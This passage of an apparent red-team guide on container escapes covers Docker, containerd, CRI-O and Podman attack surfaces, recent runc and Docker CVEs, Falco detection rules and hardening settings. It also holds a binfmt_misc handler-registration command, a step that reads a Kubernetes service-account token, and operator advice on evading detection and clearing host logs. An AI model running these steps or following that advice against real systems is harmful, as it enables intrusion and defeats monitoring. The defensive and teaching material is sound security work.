# If writable, can be used to intercept specific binary executions
mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
echo ':pwn:M::\x7fELF::/path/to/handler:' > /proc/sys/fs/binfmt_misc/register
```

---

### 11. Container Runtime Comparison

Different container runtimes have different default security configurations and escape surfaces:

#### Docker (dockerd + containerd + runc)

```
Default Security:
- Drops capabilities (keeps 14 of 41)
- Applies default seccomp profile (blocks ~44 syscalls)
- Applies default AppArmor profile (docker-default)
- Uses separate PID, mount, network, UTS, IPC namespaces
- No user namespace mapping by default (root in container = root on host)

Escape Surface:
- Docker socket (/var/run/docker.sock) if mounted
- --privileged flag disables ALL protections
- Docker API may be exposed on TCP 2375/2376
- CVE-2025-9074: Unauthenticated API in Docker Desktop
- BuildKit vulnerabilities (Leaky Vessels CVE-2024-23651/23652/23653)

Unique Risks:
- Docker Compose often uses relaxed security defaults
- Docker Swarm mode may expose management APIs
- Docker-in-Docker patterns require --privileged or socket mount
```

#### containerd (with runc)

```
Default Security:
- Similar to Docker (uses same runc backend)
- containerd socket at /run/containerd/containerd.sock
- CRI plugin provides Kubernetes integration

Escape Surface:
- containerd socket access (equivalent to Docker socket)
- Uses runc, so inherits all runc CVEs
- ctr / crictl tools can be abused if accessible
- Namespace isolation depends on CRI configuration

Unique Risks:
- Less mature default seccomp/AppArmor profiles than Docker
- Image pull credentials stored in containerd config
- containerd-shim process runs on host with container context
```

#### CRI-O (Kubernetes-native runtime)

```
Default Security:
- Purpose-built for Kubernetes (no Docker compatibility layer)
- Stricter default seccomp profile
- Supports user namespaces natively
- Read-only container root filesystem support

Escape Surface:
- Uses runc (or alternative like crun), inherits runtime CVEs
- CRI socket at /var/run/crio/crio.sock
- Less attack surface than Docker (no docker build, no swarm)

Unique Risks:
- CRI-O specific CVEs (e.g., CVE-2022-0811 CRI-O kernel parameter injection)
- Pod annotation processing may have parsing vulnerabilities
- Less community scrutiny than Docker/containerd
```

#### Podman (Daemonless)

```
Default Security:
- Rootless by default (no daemon, no root required)
- Uses user namespaces to map container root to unprivileged user
- cgroup v2 by default on newer systems
- No daemon socket to compromise

Escape Surface:
- Rootless mode significantly reduces escape impact
- Uses runc/crun as OCI runtime (inherits their CVEs)
- Podman socket (podman.sock) if remote API is enabled
- podman build uses Buildah (separate from BuildKit)

Unique Risks:
- Rootless mode may conflict with some workload requirements
- User namespace mapping adds complexity
- Some container tools assume Docker compatibility
- podman machine (for macOS/Windows) has its own attack surface

Key Advantage:
- Even if an attacker escapes, they land as an unprivileged user
  on the host (when using rootless mode), limiting impact
```

#### Runtime Comparison Matrix

```
| Feature              | Docker    | containerd | CRI-O     | Podman    |
|----------------------|-----------|------------|-----------|-----------|
| Rootless Default     | No        | No         | No        | Yes       |
| Daemon Required      | Yes       | Yes        | Yes       | No        |
| User Namespaces      | Optional  | Optional   | Optional  | Default   |
| Default Seccomp      | Yes       | Partial    | Yes       | Yes       |
| Socket Exposure      | High Risk | Medium     | Medium    | Low       |
| cgroup v2 Support    | Yes       | Yes        | Yes       | Yes       |
| Escape to Root       | Likely    | Likely     | Likely    | Unlikely* |
| OCI Runtime          | runc      | runc       | runc/crun | runc/crun |

* When using rootless mode
```

---

## 2025 Techniques

### November 2025: Triple runc Race Condition Vulnerabilities

The most significant container escape research of 2025 came from a SUSE security researcher who disclosed three interconnected runc vulnerabilities on November 5, 2025:

1. **CVE-2025-31133** (Masked Path Abuse): Targets the `maskedPaths` feature by replacing `/dev/null` with symlinks during container creation. This is a TOCTOU (time-of-check-time-of-use) race condition that tricks runc into mounting arbitrary host paths.

2. **CVE-2025-52565** (/dev/console Mount Race): Exploits a race window during `/dev/pts/$n` to `/dev/console` mounting. The attacker can redirect mounts before security protections are applied, gaining unauthorized write access to protected procfs files.

3. **CVE-2025-52881** (Procfs Write Redirect): Leverages shared mount propagation to redirect runc's own writes to `/proc` files, enabling manipulation of `/proc/sysrq-trigger` and `/proc/sys/kernel/core_pattern`.

These three vulnerabilities share a common theme: race conditions during the container creation process, exploiting the brief window between security checks and security enforcement.

### August 2025: CVE-2025-9074 Docker Desktop Escape

Docker patched a CVSS 9.3 vulnerability in Docker Desktop (CVE-2025-9074) that exposed the Docker Engine API at `192.168.65.7:2375` without authentication. Any container -- even one without Docker socket mounted -- could reach this API and create privileged containers with host filesystem access. This particularly impacted Windows (WSL2 backend) and macOS users.

### 2024-2025: Active Exploitation of Kernel CVEs

CISA confirmed in October 2025 that CVE-2024-1086 (nf_tables use-after-free) is actively exploited in ransomware campaigns. This kernel vulnerability, with a 99.4% success rate on test environments, works from within containers and can achieve full privilege escalation to root on the host.

### Emerging Research: AI/ML Container Security

The proliferation of AI/ML workloads in containers has created new escape surfaces:
- GPU passthrough (NVIDIA Container Toolkit) requires elevated privileges
- Model training containers often run privileged for RDMA/InfiniBand access
- Jupyter notebook containers frequently mount sensitive filesystems
- AI agent frameworks running in containers may have expanded capabilities that increase escape surface

---

## Detection & Defense

### Detection Methods

#### Runtime Detection

```bash
# Falco rules for container escape detection
# Deploy Falco as a DaemonSet in Kubernetes

# Example Falco rules:
# 1. Detect mount operations inside containers
- rule: Mount Inside Container
  desc: Detect mount operations inside containers
  condition: >
    evt.type = mount and container.id != host
    and not proc.name in (mount_allowed_processes)
  output: >
    Mount operation inside container
    (user=%user.name command=%proc.cmdline container=%container.name
     image=%container.image.repository)
  priority: WARNING

# 2. Detect nsenter usage
- rule: Nsenter Usage
  desc: Detect nsenter being used inside a container
  condition: >
    spawned_process and container and proc.name = nsenter
  output: >
    nsenter detected in container (user=%user.name
    command=%proc.cmdline container=%container.name)
  priority: CRITICAL

# 3. Detect access to sensitive paths
- rule: Access Sensitive Proc Files
  desc: Detect reads/writes to sensitive /proc and /sys files
  condition: >
    (open_read or open_write) and container
    and (fd.name startswith /proc/sys/kernel/core_pattern
         or fd.name startswith /proc/sysrq-trigger
         or fd.name startswith /proc/sys/kernel/modprobe)
  output: >
    Sensitive proc file accessed (file=%fd.name user=%user.name
    container=%container.name)
  priority: CRITICAL

# 4. Detect Docker socket access
- rule: Docker Socket Accessed
  desc: Detect access to Docker socket from container
  condition: >
    evt.type in (connect, sendto) and container
    and fd.name = /var/run/docker.sock
  output: >
    Docker socket accessed from container
    (user=%user.name container=%container.name)
  priority: CRITICAL
```

#### Log Sources

```
Key log sources for container escape detection:

1. Container Runtime Logs
   - Docker: /var/log/docker.log, journalctl -u docker
   - containerd: journalctl -u containerd
   - CRI-O: journalctl -u crio

2. Kernel Audit Logs
   - /var/log/audit/audit.log
   - auditd rules for mount, ptrace, bpf syscalls:
     -a always,exit -F arch=b64 -S mount -F auid>=1000 -k container_escape
     -a always,exit -F arch=b64 -S ptrace -k process_injection
     -a always,exit -F arch=b64 -S bpf -k bpf_usage

3. Seccomp Logs
   - SCMP_ACT_LOG action logs blocked syscalls
   - /var/log/kern.log or journalctl -k

4. AppArmor/SELinux Logs
   - AppArmor: /var/log/kern.log (DENIED entries)
   - SELinux: /var/log/audit/audit.log (AVC entries)

5. Kubernetes Audit Logs
   - API server audit log for pod creation with:
     - privileged: true
     - hostPID: true
     - hostNetwork: true
     - hostPath volumes
     - capabilities additions
```

### Hardening Recommendations

```yaml
# Kubernetes Pod Security Standards (Restricted)
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 65534
    runAsGroup: 65534
    fsGroup: 65534
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    image: myapp:latest
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop:
          - ALL
      # Never add these capabilities:
      # - SYS_ADMIN (enables cgroup escape, mount, BPF)
      # - SYS_PTRACE (enables process injection)
      # - NET_ADMIN (enables network manipulation)
      # - DAC_READ_SEARCH (enables bypassing file read permissions)
    volumeMounts:
    - name: tmp
      mountPath: /tmp
  volumes:
  - name: tmp
    emptyDir:
      sizeLimit: 100Mi
  # Critical: Never set these
  # hostPID: true
  # hostNetwork: true
  # hostIPC: true
  automountServiceAccountToken: false
```

```bash
# Host-level hardening

# 1. Use rootless container runtime
dockerd-rootless-setup.sh install
# Or use Podman in rootless mode (default)

# 2. Enable user namespaces
echo '{"userns-remap": "default"}' > /etc/docker/daemon.json
systemctl restart docker

# 3. Apply custom seccomp profile (more restrictive than default)
docker run --security-opt seccomp=/path/to/custom-seccomp.json myimage

# 4. Use read-only containers
docker run --read-only --tmpfs /tmp:size=100M myimage

# 5. Limit kernel capabilities
docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE myimage

# 6. Use gVisor or Kata Containers for strong isolation
# gVisor intercepts syscalls in userspace (no shared kernel)
docker run --runtime=runsc myimage
# Kata Containers uses lightweight VMs (separate kernel)
docker run --runtime=kata-runtime myimage

# 7. Keep runc updated (critical after Nov 2025 CVEs)
runc --version  # Should be >= 1.2.8, 1.3.3, or 1.4.0-rc.3

# 8. Enable cgroup v2 (eliminates release_agent escape)
# Check: stat -f -c %T /sys/fs/cgroup/
# If "tmpfs" (v1), migrate to v2:
# Add to kernel command line: systemd.unified_cgroup_hierarchy=1

# 9. Restrict access to container runtime sockets
chmod 660 /var/run/docker.sock
chown root:docker /var/run/docker.sock
```

---

## OPSEC Considerations

### For Red Team Operators

1. **Noise Level**: Container escapes are inherently noisy operations. Mount operations, namespace transitions, and process injection all generate kernel events that modern runtime security tools (Falco, Sysdig, Aqua, Prisma Cloud) will detect.

2. **Escape Selection**: Choose the quietest escape method available:
   - Docker socket mount: Moderate noise (API calls logged)
   - Privileged + nsenter: Low noise if done quickly (single operation)
   - cgroup release_agent: Moderate noise (mount + cgroup operations)
   - Kernel exploit: Variable (depends on exploit, may cause instability)

3. **Post-Escape Cleanup**: After escaping to the host, clean up artifacts:
   - Remove any scripts written to the host filesystem
   - Unmount any cgroups you mounted
   - Kill any processes you spawned
   - Clear relevant log entries if possible

4. **Avoid Kernel Exploits in Production**: Kernel exploits can cause instability, panics, or data corruption. Use configuration-based escapes (privileged, Docker socket, capabilities) when available.

5. **Fingerprinting the Runtime**: Before attempting escape, identify the container runtime and version to select the appropriate technique:
   ```bash
   # Identify runtime
   cat /proc/1/cmdline 2>/dev/null | tr '\0' ' '
   cat /proc/self/cgroup
   ls /.dockerenv 2>/dev/null && echo "Docker"
   cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null && echo "Kubernetes"
   ```

6. **Timing**: Execute escapes during periods of high activity to blend in with normal operations. Container orchestration generates substantial mount and process creation events during deployments.

7. **Staged Approach**: Consider a staged approach where you first enumerate the escape surface (capabilities, mounts, kernel version) without triggering detection, then execute the escape in a single, pre-planned operation.

---

## Cross-References

- [Kubernetes Attacks](kubernetes-attacks.md) - Post-escape lateral movement within Kubernetes clusters
- [Cloud Security Overview](../README.md) - Broader cloud attack surface context

---

## References

### CVEs and Advisories
- CVE-2019-5736: runc binary overwrite (runc < 1.0-rc6)
- CVE-2022-0492: cgroup release_agent without CAP_SYS_ADMIN (kernel < 5.16.2)
- CVE-2022-0847: Dirty Pipe arbitrary file overwrite (kernel 5.8 - 5.16.10)
- CVE-2024-1086: nf_tables use-after-free privilege escalation (kernel 5.14 - 6.6)
- CVE-2024-21626: Leaky Vessels - runc leaked file descriptor (runc <= 1.1.11)
- CVE-2024-23651: Leaky Vessels - BuildKit mount cache race
- CVE-2024-23652: Leaky Vessels - BuildKit arbitrary file deletion
- CVE-2024-23653: Leaky Vessels - BuildKit privilege check bypass
- CVE-2025-9074: Docker Desktop unauthenticated API escape (CVSS 9.3)
- CVE-2025-31133: runc masked path abuse via symlink race
- CVE-2025-52565: runc /dev/console mount race condition
- CVE-2025-52881: runc procfs write redirect via shared mounts

### Tools
- CDK (Container penetration toolkit): https://github.com/cdk-team/CDK
- Deepce (Docker enumeration and escape): https://github.com/stealthcopter/deepce
- PEIRATES (Kubernetes penetration toolkit): https://github.com/inguardians/peirates
- amicontained (Container introspection tool): https://github.com/genuinetools/amicontained
- Traitor (Linux privilege escalation): https://github.com/liamg/traitor
- BOtB (Break out the Box): https://github.com/brompwnie/botb
- LinPEAS (Linux Privilege Escalation): https://github.com/carlospolop/PEASS-ng

### Research and Blogs
- Snyk Labs: Leaky Vessels Docker and runc Container Breakout Vulnerabilities
- Wiz Blog: Leaky Vessels Deep Dive on Container Escape Vulnerabilities
- CNCF: runc Container Breakout Vulnerabilities Technical Overview (November 2025)
- Sysdig: runc Container Escape Vulnerabilities (CVE-2025-31133, CVE-2025-52565, CVE-2025-52881)
- The Hacker News: Docker Fixes CVE-2025-9074
- CrowdStrike: Active Exploitation of CVE-2024-1086
- HackTricks: Docker Breakout / Privilege Escalation
- Trail of Bits: Understanding Docker Container Escapes
- Aqua Security: Threat Alert - Threat Actors Using release_agent Container Escape
